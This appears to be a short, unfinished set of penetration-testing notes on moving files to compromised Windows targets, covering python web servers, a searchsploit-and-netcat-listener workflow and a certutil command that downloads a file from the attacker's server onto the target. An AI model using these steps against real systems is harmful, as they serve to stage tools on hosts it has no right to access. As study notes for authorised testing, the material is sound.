## Transferring Files

#####  set up webserver with python
Two step approach where you need to host the files you want to transfer on a web server (1) and download the files hosted on the web server to the target system (2). 

**SimpleHTTPServer = python2
http.server = python3** 

- copy file: `cp path/file.exe .` 
- set up http server: 
	- with python2: `python -m SimpleHTTPServer port`
	- with python 3: `python3 -m http.server port`


##### Transfer to windows targets

- exploit vulnerability with searchsploit
- read comments in exploit file 
- start http server in correct location where file is stored: 
- set up netcat listener 
- simple command shell session is established (if it did not work run again )

transfer file to target system in `tmp` directory 
in a command shell, download file: `certutil -urlcache -f http://adres_webserver:port  `


##### Transfer to linux targets 




















## Shells 

